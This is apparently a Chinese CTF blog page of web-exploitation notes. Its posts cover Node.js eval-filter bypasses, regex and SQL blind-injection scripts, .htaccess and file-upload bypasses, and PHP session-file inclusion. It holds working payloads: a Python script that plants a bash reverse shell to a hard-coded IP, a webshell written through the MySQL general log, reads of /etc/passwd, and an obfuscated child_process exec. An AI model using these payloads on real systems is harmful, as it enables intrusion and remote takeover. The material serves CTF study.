<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="built_in">global</span>[<span class="built_in">Reflect</span>.ownKeys(<span class="built_in">global</span>).find(<span class="function"><span class="params">x</span>=&gt;</span>x.includes(<span class="string">&#x27;eval&#x27;</span>))](<span class="string">&#x27;\x67\x6c\x6f\x62\x61\x6c\x5b\x52\x65\x66\x6c\x65\x63\x74\x2e\x6f\x77\x6e\x4b\x65\x79\x73\x28\x67\x6c\x6f\x62\x61\x6c\x29\x2e\x66\x69\x6e\x64\x28\x78\x3d\x3e\x78\x2e\x69\x6e\x63\x6c\x75\x64\x65\x73\x28\x27\x65\x76\x61\x6c\x27\x29\x29\x5d\x28\x27\x67\x6c\x6f\x62\x61\x6c\x2e\x70\x72\x6f\x63\x65\x73\x73\x2e\x6d\x61\x69\x6e\x4d\x6f\x64\x75\x6c\x65\x2e\x63\x6f\x6e\x73\x74\x72\x75\x63\x74\x6f\x72\x2e\x5f\x6c\x6f\x61\x64\x28\x22\x63\x68\x69\x6c\x64\x5f\x70\x72\x6f\x63\x65\x73\x73\x22\x29\x2e\x65\x78\x65\x63\x53\x79\x6e\x63\x28\x22\x63\x75\x72\x6c\x20\x31\x32\x37\x2e\x30\x2e\x30\x2e\x31\x3a\x31\x32\x33\x34\x22\x29\x27\x29&#x27;</span>)</span><br></pre></td></tr></table></figure>

<blockquote>
<p>这里还有个小trick，如果过滤了<code>eval</code>关键字，可以用<code>includes(&#39;eva&#39;)</code>来搜索<code>eval</code>函数，也可以用<code>startswith(&#39;eva&#39;)</code>来搜索</p>
</blockquote>
<h4 id="过滤中括号的情况"><a href="#过滤中括号的情况" class="headerlink" title="过滤中括号的情况"></a>过滤中括号的情况</h4><p>在<code>3.2</code>中，获取到eval的方式是通过<code>global</code>数组，其中用到了中括号<code>[]</code>，假如中括号被过滤，可以用<code>Reflect.get</code>来绕</p>
<blockquote>
<p><code>Reflect.get(target, propertyKey[, receiver])</code>的作用是获取对象身上某个属性的值，类似于<code>target[name]</code>。</p>
</blockquote>
<p>所以取eval函数的方式可以变成</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="built_in">Reflect</span>.get(<span class="built_in">global</span>, <span class="built_in">Reflect</span>.ownKeys(<span class="built_in">global</span>).find(<span class="function"><span class="params">x</span>=&gt;</span>x.includes(<span class="string">&#x27;eva&#x27;</span>)))</span><br></pre></td></tr></table></figure>

<p>后面拼接上命令执行的payload即可。</p>
<p><a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/237032">https://www.anquanke.com/post/id/237032</a></p>
<h2 id="bash盲注"><a href="#bash盲注" class="headerlink" title="bash盲注"></a>bash盲注</h2></div><hr></div><div class="recent-post-item article-container"><a class="article-title" href="/2021/08/26/%E6%AD%A3%E5%88%99%E5%8C%B9%E9%85%8D%E6%97%B6%E9%97%B4%E7%9B%B2%E6%B3%A8/">正则匹配时间盲注</a><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2021-08-26</time><div class="content"><h2 id="正则匹配时间盲注"><a href="#正则匹配时间盲注" class="headerlink" title="正则匹配时间盲注"></a>正则匹配时间盲注</h2><p>论文：<a target="_blank" rel="noopener" href="https://diary.shift-js.info/blind-regular-expression-injection/">https://diary.shift-js.info/blind-regular-expression-injection/</a><br>2021ciscn 正则表达式盲注exp</p>
<figure class="highlight rs"><table><tr><td class="code"><pre><span class="line">require <span class="symbol">&#x27;net</span>/http&#x27;</span><br><span class="line"></span><br><span class="line">CHALLENGE = <span class="symbol">&#x27;http</span>:<span class="comment">//127.0.0.1:4567/&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">String</span>.class_eval <span class="keyword">do</span></span><br><span class="line">  def hex</span><br><span class="line">    res = &#x27;&#x27;</span><br><span class="line">    <span class="keyword">self</span>.each_byte <span class="keyword">do</span> |i|</span><br><span class="line">      res += <span class="string">&quot;%02x&quot;</span> % i</span><br><span class="line">    end</span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line">  end</span><br><span class="line">end</span><br><span class="line"></span><br><span class="line">def random(len)</span><br><span class="line">  chars = (<span class="string">&quot;a&quot;</span>..<span class="string">&quot;z&quot;</span>).to_a + (<span class="string">&quot;A&quot;</span>..<span class="string">&quot;Z&quot;</span>).to_a + (<span class="string">&quot;0&quot;</span>..<span class="string">&quot;9&quot;</span>).to_a</span><br><span class="line">  s = <span class="string">&quot;&quot;</span></span><br><span class="line">  <span class="number">1</span>.upto(len) <span class="keyword">do</span></span><br><span class="line">    s &lt;&lt; chars[rand(chars.size - <span class="number">1</span>)]</span><br><span class="line">  end</span><br><span class="line">  s</span><br><span class="line">end</span><br><span class="line"></span><br><span class="line">def check_result(reg, suffix)</span><br><span class="line">  full_regexp = <span class="string">&quot;^(?=&quot;</span> + reg + <span class="string">&quot;)((.*)*)*&quot;</span> + suffix</span><br><span class="line">  p full_regexp</span><br><span class="line">  uri = URI(CHALLENGE + <span class="symbol">&#x27;check</span>/&#x27; + full_regexp.hex)</span><br><span class="line">  Net::HTTP.get_response(uri)</span><br><span class="line">end</span><br><span class="line"></span><br><span class="line">def leak(flag, r)</span><br><span class="line">  chars = &#x27;<span class="number">0123456789</span>abcdef&#x27;</span><br><span class="line">  (<span class="number">0</span>..<span class="number">15</span>).each <span class="keyword">do</span> |i|</span><br><span class="line">    <span class="keyword">if</span> check_result(flag + chars[i], r).body[<span class="string">&quot;False&quot;</span>]</span><br><span class="line">      p flag + chars[i]</span><br><span class="line">      <span class="keyword">return</span> leak(flag + chars[i], r)</span><br><span class="line">    end</span><br><span class="line">  end</span><br><span class="line">end</span><br><span class="line"></span><br><span class="line">r = random(<span class="number">10</span>)+<span class="string">&#x27;$&#x27;</span></span><br><span class="line">leak(&#x27;&#x27;, r)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># <span class="string">&quot;facdf9972bb5fdf9c35d6e09770e9af7&quot;</span></span><br></pre></td></tr></table></figure>

</div><hr></div><div class="recent-post-item article-container"><a class="article-title" href="/2021/08/18/%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C/">文件操作</a><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2021-08-18</time><div class="content"><h1 id="文件上传绕过"><a href="#文件上传绕过" class="headerlink" title="文件上传绕过"></a>文件上传绕过</h1><h2 id="前段验证绕过"><a href="#前段验证绕过" class="headerlink" title="前段验证绕过"></a>前段验证绕过</h2><p>改js文件</p>
<h2 id="MIME-TYPE绕过"><a href="#MIME-TYPE绕过" class="headerlink" title="MIME-TYPE绕过"></a>MIME-TYPE绕过</h2><p>抓包改</p>
<h2 id="黑名单后缀绕过"><a href="#黑名单后缀绕过" class="headerlink" title="黑名单后缀绕过"></a>黑名单后缀绕过</h2><p>选择php3、php4、phtml等不常见后缀</p>
<h2 id="双写绕过"><a href="#双写绕过" class="headerlink" title="双写绕过"></a>双写绕过</h2><h2 id="文件内容绕过"><a href="#文件内容绕过" class="headerlink" title="文件内容绕过"></a>文件内容绕过</h2><?php短标签的替代

## .htaccess的利用

### 按照php进行解析

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">AddHandlerphp5-script .jpg</span><br><span class="line">&lt;!--将.jpg文件按照php代码进行解析执行--&gt;</span><br><span class="line"></span><br><span class="line">AddTypeapplication&#x2F;x-httpd-php.jpg</span><br><span class="line">&lt;!--将.jpg文件按照php代码进行解析执行--&gt;</span><br><span class="line"></span><br><span class="line">Sethandlerapplication&#x2F;x-httpd-php</span><br><span class="line">&lt;!--将该目录及子目录下的文件均按照php文件解析执行--&gt;</span><br></pre></td></tr></table>

### 进行文件包含

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">php_valueauto_append_file&#x2F;tmp&#x2F;webshell.txt</span><br><span class="line">php_valueauto_append_file&#x2F;tmp&#x2F;sess_xxxxxx</span><br></pre></td></tr></table></figure>

### 上传htaccess发现有内容过滤（php）

**方法1**.：使用cgi方式进行解析
将以下内容写入htaccess后上传
内容为：使用cgi的解析脚本

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Options +ExecCGI</span><br><span class="line">SetHandlercgi-script</span><br></pre></td></tr></table></figure>

上传cgi文件

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#!&#x2F;bin&#x2F;bash</span><br><span class="line">echo &quot;Content-Type: text&#x2F;plain”</span><br><span class="line">echo &quot;&quot;</span><br><span class="line">cat &#x2F;flag</span><br><span class="line">exit 0</span><br></pre></td></tr></table></figure>

**方法2**:反斜线+换行

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">AddTypeapplication&#x2F;x-httpd-p\</span><br><span class="line">hp.jpg</span><br></pre></td></tr></table></figure>

**方法3**：使用shtml方式进行解析

htaccess上传一下内容

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">AddType text&#x2F;html .shtml</span><br><span class="line">AddHandler server-parsed .shtml</span><br><span class="line">Options Includes</span><br></pre></td></tr></table></figure>

shtml内进行命令执行

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;pre&gt;</span><br><span class="line">&lt;!--#exec cmd&#x3D;&quot;whoami&quot; --&gt;</span><br><span class="line">&lt;&#x2F;pre&gt;</span><br></pre></td></tr></table></figure>

### user.ini文件的利用

## 文件包含利用

### 本地文件包含利用点

#### 包含目录下的文件

#### 获取web目录或者其他配置文件

#### 包含上传的附件

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?file&#x3D;..&#x2F;......&#x2F;xxx.file</span><br></pre></td></tr></table></figure>

#### 包含/读取session文件:

save_path为novalue则表示存储在默认的/tmp或/var/lib/php/session目录下
我们可以利用session.upload_progress将木马写入session文件，然后包含这个session文件。

<img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210906203200.png" alt="img" style="zoom:67%;">

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?file&#x3D;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;tmp&#x2F;sess_xxxx</span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line">sess_id=<span class="string">&quot;tlife&quot;</span></span><br><span class="line">s=requests.session()</span><br><span class="line">url=<span class="string">&quot;http://b.y1ng.vip:2014&quot;</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">session_upload</span>():</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        res= s.post(</span><br><span class="line">            url=<span class="string">f&quot;<span class="subst">&#123;url&#125;</span>?page=/tmp/sess_<span class="subst">&#123;sess_id&#125;</span>&quot;</span>,</span><br><span class="line">            data=&#123;</span><br><span class="line">                <span class="string">&#x27;PHP_SESSION_UPLOAD_PROGRESS&#x27;</span>: <span class="string">&quot;&lt;?=`bash -c &#x27;bash -i &gt;&amp; /dev/tcp/110.42.133.120/9999 0&gt;&amp;1&#x27;`;?&gt;&quot;</span></span><br><span class="line">            &#125;,</span><br><span class="line">            files=&#123;<span class="string">&quot;file&quot;</span>: (<span class="string">&#x27;xxx.txt&#x27;</span>, open(<span class="string">&quot;shell.txt&quot;</span>, <span class="string">&quot;r&quot;</span>))&#125;,</span><br><span class="line">            cookies=&#123;<span class="string">&#x27;PHPSESSID&#x27;</span>:sess_id&#125;</span><br><span class="line">        )</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">100</span>):</span><br><span class="line">    thread=threading.Thread(target=session_upload)</span><br><span class="line">    thread.start()</span><br><span class="line"></span><br></pre></td></tr></table></figure>



#### 读取phpinfo可以包含临时文件

#####  1.条件竞争

##### 2.php7.0 filter新特性

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">file&#x3D;php:&#x2F;&#x2F;filter&#x2F;string.strip_tags&#x2F;resource&#x3D;&#x2F;etc&#x2F;passwd</span><br></pre></td></tr></table></figure>

会造成一个segment fault，导致临时文件不会被删除

##### 3.自己包含自己

上传文件让其一直被执行包含
访问包含文件即可。

#### 利用php流input

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?file&#x3D;php:&#x2F;&#x2F;input(需要allow_url_include&#x3D;On)</span><br></pre></td></tr></table></figure>

filte协议读源码：

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">若base64-encode被过滤，可以更换另一种编码方式</span><br><span class="line">?page&#x3D;php:&#x2F;&#x2F;filter&#x2F;convert.iconv.ASCII.UCS-2BE&#x2F;resource&#x3D;index.php如果没有过滤utf，使用convert.iconv.utf-8.utf-7</span><br><span class="line">https:&#x2F;&#x2F;www.php.net&#x2F;manual&#x2F;en&#x2F;mbstring.supported-encodings.php</span><br></pre></td></tr></table></figure>

或者直接base64-encode的二次urlencode

## 文件读取可读内容整理

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">proc 是个好东西，总结下经常会用到的文件：</span><br><span class="line">1.maps 记录一些调用的扩展或者自定义so 文件</span><br><span class="line">2.environ 环境变量</span><br><span class="line">3.comm当前进程运行的程序</span><br><span class="line">4.cmdline程序运行的绝对路径</span><br><span class="line">5.cpusetdocker环境可以看machine ID</span><br><span class="line">6.cgroupdocker环境下全是machine ID 不太常用</span><br></pre></td></tr></table></figure>

## nodejs文件读取

python 或者js 最重要的文件一般都是app.js

path-as-is问题，对斜线进行url编码

## python文件读取

### 过滤了./进行目录穿越

python黑魔法：
两个都是平级目录，会直接从选取后一个目录进行读取

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">os.path.join(&#39;&#x2F;tmp&#39;,&#39;&#x2F;etc&#x2F;passwd&#39;)</span><br><span class="line">和</span><br><span class="line">os.path.join(&#39;&#x2F;tmp&#39;,&#39;&#x2F;..&#x2F;..&#x2F;etc&#x2F;passwd&#39;)是等价的</span><br></pre></td></tr></table></figure>

</div><hr></div><div class="recent-post-item article-container"><a class="article-title" href="/2021/08/09/%E5%A0%86%E5%8F%A0-%E6%97%A0%E5%88%97%E5%90%8D-%E6%97%B6%E9%97%B4%E7%9B%B2%E6%B3%A8/">堆叠+无列名+时间盲注</a><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2021-08-09</time><div class="content"><h2 id="延时盲注"><a href="#延时盲注" class="headerlink" title="延时盲注"></a>延时盲注</h2><h3 id="延时函数："><a href="#延时函数：" class="headerlink" title="延时函数："></a>延时函数：</h3><h4 id="sleep"><a href="#sleep" class="headerlink" title="sleep()"></a>sleep()</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">select sleep();</span><br></pre></td></tr></table></figure>

<h4 id="benchmark"><a href="#benchmark" class="headerlink" title="benchmark()"></a>benchmark()</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">select benchmark(100000,sha1(sha1(sha1(&#39;tlfie&#39;))));</span><br></pre></td></tr></table></figure>

<h4 id="get-lock"><a href="#get-lock" class="headerlink" title="get_lock"></a>get_lock</h4><p>在一个session中先锁定一个变量 然后通过另一个session，再次执行get_lock函数</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">select get_lock(&#39;tlife&#39;,1);</span><br><span class="line">select get_lock(&#39;tlife&#39;,5);</span><br></pre></td></tr></table></figure>

<p>但也不是每次都能用，需要提供长连接，在Apache+PHP搭建的环境中需要使用mysql_pconnect函数来连接数据库，所以只能根据环境去实际测试一下，我在本地也没测试成功</p>
<h4 id="正则表达式延时"><a href="#正则表达式延时" class="headerlink" title="正则表达式延时"></a>正则表达式延时</h4><p>正则匹配在匹配较长字符串但自由度比较高的字符串时，会造成比较大的计算量，我们通过rpad或repeat构造长字符串，加以计算量大的pattern，通过控制字符串长度我们可以控制延时。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">select rpad(&#39;a&#39;,4999999,&#39;a&#39;) RLIKE concat(repeat(&#39;(a.*)+&#39;,30),&#39;b&#39;);</span><br></pre></td></tr></table></figure>

<h2 id="文件操作"><a href="#文件操作" class="headerlink" title="文件操作"></a>文件操作</h2><h3 id="mysql变量"><a href="#mysql变量" class="headerlink" title="mysql变量"></a>mysql变量</h3><p>可以通过</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">show variables</span><br></pre></td></tr></table></figure>

<p>来查看系统变量以及其值<br><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210809141142.png" alt="img" style="zoom:67%;"></p>
<h4 id="和文件有关的变量secure-file-priv"><a href="#和文件有关的变量secure-file-priv" class="headerlink" title="和文件有关的变量secure_file_priv"></a>和文件有关的变量secure_file_priv</h4><p><code>secure_file_priv</code>对读写文件有影响。</p>
<p><code>secure-file-priv</code>参数是用来限制LOAD DATA, SELECT … OUTFILE, and LOAD_FILE()传到哪个指定目录的。</p>
<p>当secure_file_priv的值为null ，表示限制mysqld不允许导入|导出。默认是nul</p>
<p>l当secure_file_priv的值为/tmp/ ，表示限制mysqld的导入|导出只能发生在/tmp/目录下</p>
<p>当secure_file_priv的值没有具体值时，表示不对mysqld的导入|导出做限制</p>
<h5 id="读文件"><a href="#读文件" class="headerlink" title="读文件"></a>读文件</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">select load_file(&#39;&#x2F;flag&#39;)</span><br><span class="line">select  CONVERT(LOAD_FILE(&quot;&#x2F;etc&#x2F;passwd&quot;) USING utf8);</span><br></pre></td></tr></table></figure>

<h5 id="写文件"><a href="#写文件" class="headerlink" title="写文件"></a>写文件</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">select &quot;&lt;?php phpinfo();?&gt;&quot; into outfile &quot;&#x2F;tmp&#x2F;1.php&quot;</span><br><span class="line">select &quot;&lt;?php phpinfo();?&gt;&quot; into dumpfile &quot;&#x2F;tmp&#x2F;1.php&quot;</span><br></pre></td></tr></table></figure>

<p><strong>outfile函数在将数据写到文件里时有特殊的格式转换，而dumpfile则保持原数据格式</strong></p>
<h2 id="堆叠注入"><a href="#堆叠注入" class="headerlink" title="堆叠注入"></a>堆叠注入</h2><h3 id="堆叠注入条件"><a href="#堆叠注入条件" class="headerlink" title="堆叠注入条件"></a>堆叠注入条件</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$mysqli-&gt;multi_query($sql);</span><br></pre></td></tr></table></figure>

<h3 id="当secure-file-priv为null时"><a href="#当secure-file-priv为null时" class="headerlink" title="当secure_file_priv为null时"></a>当secure_file_priv为null时</h3><p>如果堆叠注入，可以利用log日志文件写马</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">set global general_log&#x3D;on;</span><br><span class="line">set global general_log_file&#x3D;&#39;xxxx&#39;;-- 设置日志文件保存位置</span><br><span class="line">select &#39;&lt;?php eval($_POST[&#39;a&#39;]); ?&gt;&#39;;-- 该内容将会被写入日志中</span><br></pre></td></tr></table></figure>

<h3 id="堆叠注入中select被过滤"><a href="#堆叠注入中select被过滤" class="headerlink" title="堆叠注入中select被过滤"></a>堆叠注入中select被过滤</h3><h4 id="handler"><a href="#handler" class="headerlink" title="handler"></a>handler</h4><p>mysql除可使用select查询表中的数据，也可使用handler语句，这条语句使我们能够一行一行的浏览一个表中的数据，不过handler语句并不具备select语句的所有功能。它是mysql专用的语句，并没有包含到SQL标准中。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">handler users open as hd; #指定数据表进行载入并将返回句柄重命名</span><br><span class="line">handler hd read first; #读取指定表&#x2F;句柄的首行数据</span><br><span class="line">handler hd read next;#读取指定表&#x2F;句柄的下一行数据</span><br><span class="line">handler hdclose; #关闭句柄</span><br></pre></td></tr></table></figure>

<h3 id="mysql预处理"><a href="#mysql预处理" class="headerlink" title="mysql预处理"></a>mysql预处理</h3><p>一、SQL 语句的执行处理<br>1、即时 SQL<br>　　一条 SQL 在 DB 接收到最终执行完毕返回，大致的过程如下：</p>
<p>　　1. 词法和语义解析；<br>　　2. 优化 SQL 语句，制定执行计划；<br>　　3. 执行并返回结果；<br>　　如上，一条 SQL 直接是走流程处理，一次编译，单次运行，此类普通语句被称作 Immediate Statements （即时 SQL）。<br>2、预处理 SQL<br>　　但是，绝大多数情况下，某需求某一条 SQL 语句可能会被反复调用执行，或者每次执行的时候只有个别的值不同（比如 select 的 where 子句值不同，update 的 set 子句值不同，insert 的 values 值不同）。如果每次都需要经过上面的词法语义解析、语句优化、制定执行计划等，则效率就明显不行了。<br>　　所谓预编译语句就是将此类 SQL 语句中的值用占位符替代，可以视为将 SQL 语句模板化或者说参数化，一般称这类语句叫Prepared Statements。<br>　　预编译语句的优势在于归纳为：一次编译、多次运行，省去了解析优化等过程；此外预编译语句能防止 SQL 注入</p>
<p><strong>实例如下，可以预编译一个语句然后执行即可，里面的变量是可以更换的</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">set @a&#x3D;xxxx;</span><br><span class="line">prepare stmt1 from @a;</span><br><span class="line">execute stmt1;</span><br></pre></td></tr></table></figure>

<p><strong>例1：</strong></p>
<img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210809222939.png" alt="img" style="zoom:50%;">

<p>以上 不设置变量直接使用，以下为设置了变量直接进行调用，<br><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210809223557.png" alt="img" style="zoom:50%;"></p>
<p>这是另一种使用方式，但是似乎无法使用字符串<br><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210809225938.png" alt="img" style="zoom:67%;"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">DELIMITER $$create procedure fuck(out oo text(999), in ii text(999))BEGINset oo &#x3D; ii;END$$call fuck(@a, 0x73656C656374202731323327)$$prepare b from @a$$execute b$$</span><br></pre></td></tr></table></figure>

<h2 id="无列名盲注"><a href="#无列名盲注" class="headerlink" title="无列名盲注"></a>无列名盲注</h2><h3 id="过滤了in-or"><a href="#过滤了in-or" class="headerlink" title="过滤了in/or"></a>过滤了in/or</h3><p>过滤了in/or导致无法使用information_schema</p>
<h4 id="替代库"><a href="#替代库" class="headerlink" title="替代库"></a>替代库</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">select table_name from sys.schema_auto_increment_columns where tabe_schema&#x3D;database();</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210812092546.png" alt="img"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">select table_name from mysql.innodb_table_stats where database_name&#x3D;&#39;security&#39;</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210812100435.png" alt="img"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">select group_concat(table_name) from sys.schema_table_statistics</span><br></pre></td></tr></table></figure>

<p>但是我们查询不了列名，这个时候就需要使用无列名盲注</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#查询所有的库</span><br><span class="line">SELECT table_schemaFROM sys.schema_table_statisticsGROUP BY table_schema;</span><br><span class="line">SELECT table_schemaFROM sys.x$schema_flattened_keysGROUP BY table_schema;</span><br><span class="line">#查询指定库的表（若无则说明此表从未被访问）</span><br><span class="line">SELECT table_nameFROM sys.schema_table_statisticsWHERE table_schema&#x3D;&#39;mspwd&#39; GROUP BY table_name;</span><br><span class="line">SELECT table_nameFROM sys.x$schema_flattened_keysWHERE table_schema&#x3D;&#39;mspwd&#39; GROUP BY table_name;</span><br><span class="line">#统计所有访问过的表次数:库名,表名,访问次数</span><br><span class="line">select table_schema,table_name,sum(io_read_requests+io_write_requests) iofrom sys.schema_table_statisticsgroup by table_schema,table_nameorder by iodesc;</span><br><span class="line">#查看所有正在连接的用户详细信息</span><br><span class="line">SELECT user,db,command,current_statement,last_statement,timeFROM sys.session;</span><br><span class="line">#查看所有曾连接数据库的IP,总连接次数</span><br><span class="line">SELECT host,total_connectionsFROM sys.host_summary;</span><br></pre></td></tr></table></figure>



<h3 id="无列名盲注-1"><a href="#无列名盲注-1" class="headerlink" title="无列名盲注"></a>无列名盲注</h3><h4 id="union重命名"><a href="#union重命名" class="headerlink" title="union重命名"></a>union重命名</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">select 1,2,3 union select * from users</span><br></pre></td></tr></table></figure>

<img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210812102846.png" alt="img" style="zoom:67%;">
**注入语句可写为**

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">select group_concat(a.2) from (select 1,2,3 union select * from users);</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210812104342.png" alt="img"></p>
<h4 id="比较法"><a href="#比较法" class="headerlink" title="比较法"></a>比较法</h4><p>这就是盲注的思想了，前面的部分是你要注的内容，因为要判断不同，所以后面的都应该是最大的zzz 这样才能保证每一位的改变能影响后面的</p>
<p><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210812114529.png" alt="img"></p>
<p>这是对比第二位是的完整结果是admin<br><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210812114822.png" alt="img" style="zoom:67%;"></p>
<p>编写脚本的时候可能还需要做一个该字段是否结束的判断，也就是从一开始遍历到最后都没改变 说明结束了</p>
<img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210812115102.png" alt="img" style="zoom:50%;"></div><hr></div><div class="recent-post-item article-container"><a class="article-title" href="/2021/08/09/sql-%E6%97%A0%E5%88%97%E5%90%8D%E7%9B%B2%E6%B3%A8/">sql-无列名盲注</a><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2021-08-09</time><div class="content"><h1 id="无列名盲注"><a href="#无列名盲注" class="headerlink" title="无列名盲注"></a>无列名盲注</h1><h2 id="比较法"><a href="#比较法" class="headerlink" title="比较法"></a>比较法</h2><h3 id="1-fuzz过滤内容"><a href="#1-fuzz过滤内容" class="headerlink" title="1.fuzz过滤内容"></a>1.fuzz过滤内容</h3><p>fuzz一下 发现select 和union都被过滤了，回顾一下select被过滤有什么能替代的<br>在堆叠注入中可以使用handler，使用预处理拼接绕过，还有mysql的8.0+新版本中的table</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">table 表名;</span><br></pre></td></tr></table></figure>

<img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210812162348.png" alt="img" style="zoom:67%;">

<h3 id="判断注入类型"><a href="#判断注入类型" class="headerlink" title="判断注入类型"></a>判断注入类型</h3><p>页面有两种不同的回显方式：<br><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210812163446.png" alt="img" style="zoom:67%;"><br><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210812163447.png" alt="img" style="zoom:67%;"></p>
<p>确定使用布尔盲注</p>
<h3 id="编写盲注脚本"><a href="#编写盲注脚本" class="headerlink" title="编写盲注脚本"></a>编写盲注脚本</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#payload&#x3D;&quot;database()&quot;#ctf</span><br><span class="line">payload&#x3D;&quot;version()&quot;#8.0.26-0ubuntu0.20.04.2</span><br></pre></td></tr></table></figure>

<p>确定版本8.0+使用table进行注入</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">table information_schema.tables</span><br></pre></td></tr></table></figure>

<p>但是想要获得ctf的那个表的相关列数据，我们还需要自己去注<br><strong>难点：</strong>由于table 没有where 也没有group_concat，所以我们无法按照常规方法得到ctf的那个库有什么表，此时就需要使用无列名盲注。先通过无列名盲注注出ctf下的表，在通过无列名盲注注出ctf下的字段数据</p>
<h4 id="表位置探测"><a href="#表位置探测" class="headerlink" title="表位置探测"></a>表位置探测</h4><p>利用比较法：<br>首先我们需要找出哪一行是我们需要的,本地测试发现，information_schema.tables有21个列，并且第一个字段值为def 第二个为数据库，由于我们已经知道数据库名字了，所以可以这样判断，不断更改limit的值，判断结果是否为1</p>
<p>并且可以利用这个转折点进行判断是否为我们需要的库<br><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210812193913.png" alt="img" style="zoom:67%;"></p>
<p><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210812192810.png" alt="img"></p>
<p>写一个探测的脚本<br>本来是想按照上面那个思路写的脚本，但是发现没有探测出来，于是换了一种思路，直接从第一位开始，因为我已经知道数据库的名字是ctf，所以按照 order by table_schema的排序 那么这个表就会在比较前面的位置</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">search_co</span>():</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">100</span>):</span><br><span class="line">        payload=<span class="string">f&quot;admin&#x27;and/**/(&#x27;def&#x27;,&#x27;d&#x27;,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1)&lt;(table information_schema.tables order by table_schema limit <span class="subst">&#123;i&#125;</span>,1)#&quot;</span>.replace(<span class="string">&quot; &quot;</span>,<span class="string">&quot;/**/&quot;</span>)</span><br><span class="line">        data1=&#123;</span><br><span class="line">            <span class="string">&#x27;username&#x27;</span>:payload,</span><br><span class="line">            <span class="string">&#x27;password&#x27;</span>:<span class="string">&quot;123&quot;</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">#print(data1)</span></span><br><span class="line">        <span class="comment">#print(s.post(url=url,data=data1).text)</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;username error!&quot;</span> <span class="keyword">in</span> s.post(url=url,data=data1).text:</span><br><span class="line">            print(<span class="string">&quot;ctf库在第&quot;</span>,i,<span class="string">&quot;列&quot;</span>)</span><br></pre></td></tr></table></figure>

<img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210813101520.png" alt="img" style="zoom:67%;">

